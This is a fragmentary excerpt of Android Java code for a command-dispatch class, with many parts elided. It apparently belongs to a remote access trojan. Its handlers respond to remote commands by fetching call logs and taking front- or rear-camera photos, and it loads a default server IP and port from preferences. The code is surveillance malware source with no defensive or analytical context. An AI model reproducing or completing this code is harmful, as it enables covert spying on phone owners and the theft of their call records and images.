...
public class ProcessCommand
{
	...
	public void process(short cmd, byte[] args, int chan)
	{
		...
		Log.e("commande", "commande:"+commande);
		...
		{
			Log.e("commande:", "Protocol.GET_CALL_LOGS:" + 118 + "arguments.array():" + arguments.array());
		...
		} else if(commande == Protocol.GET_PICTURE_FRONT)
		{
			//TODO 	前置摄像头
			client.sendInformation("Photo picture request received");
			client.photoTaker = new PhotoTaker(client, chan,Protocol.GET_PICTURE_FRONT);// ,client.view);
		...
		{
			client.sendInformation("Photo picture request received");
			client.photoTaker = new PhotoTaker(client, chan,Protocol.GET_PICTURE);// ,client.view);
			if (!client.photoTaker.takePhoto())
				client.sendError("Something went wrong while taking the picture");
			
//			Bundle extras = new Bundle();
//			intent = new Intent();
//			intent.setClass(client, CameraActivity.class);
...
//				client.sendError("Something went wrong while taking the picture");
	...
	public PreferencePacket loadPreferences()
	{
		...
		p.setIp( settings.getString("ip", "172.16.100.188"));
		p.setPort (settings.getInt("port", 49999));
